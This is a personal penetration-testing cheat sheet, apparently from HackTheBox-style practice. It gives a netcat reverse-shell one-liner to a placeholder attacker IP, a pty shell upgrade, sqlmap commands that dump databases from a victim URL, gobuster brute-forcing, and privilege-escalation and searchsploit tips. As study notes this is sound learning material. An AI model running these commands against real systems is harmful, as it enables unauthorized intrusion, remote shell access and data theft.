<link href="../../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Useful Shit<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

_________________________


<span class="date">Last Updated: 26/Aug/2021</span> 


<br/> 

### <span class="useful_shit subtitle">Most Reliable Reverse Shell Payload  
  ```console
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
  ```

 <br/><br/> 

### <span class="useful_shit subtitle">Python Script That Spawns a Shell When connecting to a Reverse Shell  
```console
python -c 'import pty;pty.spawn("/bin/bash");'
```
  <br/><br/> 

### <span class="useful_shit subtitle">SQLMAP  
* So I'm taking the machine "Cronos" as my example here because it's the first time I use `sqlmap` in.
* We can enumerate the databases names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data='username=&password=' --method POST --dbs --batch
  ```
* In addition to the databases' names the previous line also provided me with the version of the SQL on the server. 
* `--batch` answers the questions for me with the default. 
<br/>
* We can also get the tables' names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data="username=&password=" --method POST -D [DATABASE NAME] --dump all --batch
  ```
* When using this command I also got the content of the admin table. 
* Sqlmap seems to use the SQLi vulneribility in the application to gain access to:
  * Determine the schema of the database (database, table and column names).
  * Dump data from tables.
  * Potentially upload or download files to the database server machine.
  * Perform out-of-band tests.
  * Dump usernames, password hashes, privileges and roles.
  * Pass hashes off to a password cracker for a dictionary attack.
  * Perform "blind" and "boolean-based" sql injection attacks (if the web application doesn't return any error messages then sqlmap is the most time-saving tool in this case).
  * Potentially even launch a remote shell on the database server.

 <br/><br/> 

### <span class="useful_shit subtitle">Robots.txt  

<blockquote>
The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index.  
The presence of the robots.txt does not in itself present any kind of security vulnerability. However, it is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability.
</blockquote>  

 <br/><br/> 

### <span class="useful_shit subtitle">Gobuster Bruteforcing Directories and Subdomains  
* Command to bruteforece in `DIR` mode  
```console
gobuster dir -u [VICTIM'S LINK] -x [LIST OF EXTENSIONS] -w [WORDLIST PATH]
```  

* Command to bruteforce `DNS` mode  
```console
gobuster dns -d [WEB SERVICE DOMAIN] -W [WORDLIST PATH]
```

 <br/><br/> 

### <span class="useful_shit subtitle">DNS Zone Transfer  
* Definition?
  Is the process of copying the contents of the zone file on a primary DNS server to a secondary DNS server.  
  And this way fault tolerance is provided.

 <br/><br/> 

### <span class="useful_shit subtitle">Dirsearch  

* Check out <a href="https://github.com/maurosoria/dirsearch">this link</a> to git clone it.
* We can use it instead of Dirbuster or Gobuster.

 <br/><br/> 

### <span class="useful_shit subtitle">PrivEsc 😈


* `cat /etc/shells`   
* Shows me what shells the machine uses  

<br/>

* `scp [PATH TO FILE ON MY SYSTEM] [USERNAME]@[TARGET IP]:[PATH ON TARGET TO TRANSFER FILE TO]` 
* Only works when I have the password of the user.

<br/>

* `[COMMAND] | tee [FILE NAME]` 
* Stores output of the command in a file.  

<br/>

* `dpkg -l`  
* Shows the packages and libraries on system.
* I think this command is only for Debian based OSes 🤔.

<br/>

* `/usr/share/exploitdb/exploits`
* ExploitDB's exploits are saved in this path.  

<br/>

* Tools we can use to make life easier  
* <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a>, <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux-Smart-Enumeration</a> and <a href="https://github.com/DominicBreuker/pspy">Pspy</a>.  

<br/>

* Some info on gcc  
* The option `-Wall` is a warning option.  


 <br/><br/> 

### <span class="useful_shit subtitle">Searchsploit  

* `searchsploit -x [EXPLOIT PATH]`
* Can be used to view the exploit code.

<br/>

* `searchsploit -m [EXPLOIT PATH]`
* Copies the exploit to my working directory 😱.

<br/>

* People that name exploits sometimes name the versions wrongly. So, don't trusts the version in the name of the exploit.   

